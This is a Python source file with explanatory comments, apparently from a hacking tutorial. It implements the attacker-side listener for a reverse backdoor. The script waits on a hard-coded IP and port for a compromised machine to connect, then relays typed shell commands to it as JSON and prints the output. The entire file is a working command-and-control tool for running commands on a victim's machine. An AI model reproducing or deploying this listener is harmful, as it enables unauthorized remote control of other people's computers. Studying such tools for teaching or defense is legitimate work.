import socket,json



class Listener: 

    def __init__(self, ip, port):

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        #This is identical to the socket initialization in the reverse backdoor file. 



        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)      #Change options in the listener. We can change any option we want. We choose level, option/attribute that we want to modify and it's value. 



        listener.bind((ip, port))                                           #Ip of the listening machine



        listener.listen(0)                                                  #We set the backlog to 0. Backlog is the number of connections that can be queued before the system starts refusing connections. 

                                                                            #Setting is to 0 means "Don't queue any connections, connect directly"



        print("[+] Waiting for incoming connections")

        self.connection, address = listener.accept()                             #The accept() method returns a socket object representing the connection and the ip address bound to it. 

        print(f"[+] Got a connection from {address}")



    def send(self, data):

        json_data = json.dumps(data)

        self.connection.send(json_data.encode())

    

    def recieve(self):

        json_data = ""

        while True:

            try:

                json_data += self.connection.recv(1024).decode('utf-8')

                return json.loads(json_data)

            except Exception:

                continue





    def execute_remotely(self, command):

        self.send(command)

        return self.recieve()



    def run(self):

        while True:

            command = input(">>")

            if command.lower() == "exit":

                break

            result= self.execute_remotely(command)

            print(result)





my_listener = Listener("192.168.1.186", 8080)

my_listener.run()